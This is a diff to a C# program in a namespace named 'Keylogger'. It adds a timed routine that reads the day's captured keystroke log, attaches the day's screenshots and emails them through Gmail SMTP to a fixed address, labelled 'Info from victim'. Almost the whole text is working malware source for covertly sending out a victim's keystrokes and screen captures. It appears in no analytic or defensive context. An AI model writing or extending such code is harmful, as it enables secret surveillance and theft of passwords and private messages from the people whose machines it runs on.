@@ -1,5 +1,6 @@
 using System.Diagnostics;
 using System.Drawing.Imaging;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 
 namespace Keylogger
@@ -135,7 +136,14 @@ namespace Keylogger
                     Thread.Sleep(1);
 
                     if (interval % captureTime == 0)
+                    {
                         CaptureScreen();
+                    }
+
+                    if (interval % mailTime == 0)
+                    {
+                        SendMail();
+                    }
 
                     interval++;
 
@@ -190,6 +198,56 @@ namespace Keylogger
             }
             imageCount++;
         }
+        #endregion
+
+        #region mail
+        static int mailTime = 1000;
+        static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("email@gmail.com");
+                mail.To.Add("email@gmail.com");
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Info from victim\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendition;
+
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                    {
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                    }
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Mail Send");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+
         #endregion
 
         [STAThread]
